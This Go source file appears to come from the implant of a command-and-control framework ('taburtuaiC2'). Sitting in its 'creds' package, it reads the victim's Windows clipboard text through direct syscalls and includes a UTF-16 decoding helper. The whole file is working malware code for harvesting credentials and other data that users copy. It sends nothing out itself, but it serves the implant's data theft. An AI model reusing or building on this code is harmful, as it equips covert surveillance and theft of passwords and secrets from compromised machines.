//go:build windows

package creds

import (
	"fmt"
	"unsafe"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

// ReadClipboard returns the current clipboard text content.
func ReadClipboard() (string, error) {
	r, _, e := winsyscall.ProcOpenClipboard.Call(0)
	if r == 0 {
		return "", fmt.Errorf("OpenClipboard: %v", e)
	}
	defer winsyscall.ProcCloseClipboard.Call()

	// CF_UNICODETEXT = 13
	hData, _, e := winsyscall.ProcGetClipboardData.Call(13)
	if hData == 0 {
		return "", fmt.Errorf("GetClipboardData(CF_UNICODETEXT): %v", e)
	}

	ptr, _, e := winsyscall.ProcGlobalLock.Call(hData)
	if ptr == 0 {
		return "", fmt.Errorf("GlobalLock: %v", e)
	}
	defer winsyscall.ProcGlobalUnlock.Call(hData)

	sz, _, _ := winsyscall.ProcGlobalSize.Call(hData)
	if sz == 0 {
		return "", nil
	}

	nChars := sz / 2
	u16 := unsafe.Slice((*uint16)(unsafe.Pointer(ptr)), nChars)
	end := nChars
	for i := uintptr(0); i < nChars; i++ {
		if u16[i] == 0 {
			end = i
			break
		}
	}
	return string(clipboardUTF16ToRunes(u16[:end])), nil
}

func clipboardUTF16ToRunes(u16 []uint16) []rune {
	runes := make([]rune, 0, len(u16))
	for i := 0; i < len(u16); i++ {
		r := rune(u16[i])
		if r >= 0xD800 && r <= 0xDBFF && i+1 < len(u16) {
			low := rune(u16[i+1])
			if low >= 0xDC00 && low <= 0xDFFF {
				r = (r-0xD800)*0x400 + (low - 0xDC00) + 0x10000
				i++
			}
		}
		runes = append(runes, r)
	}
	return runes
}
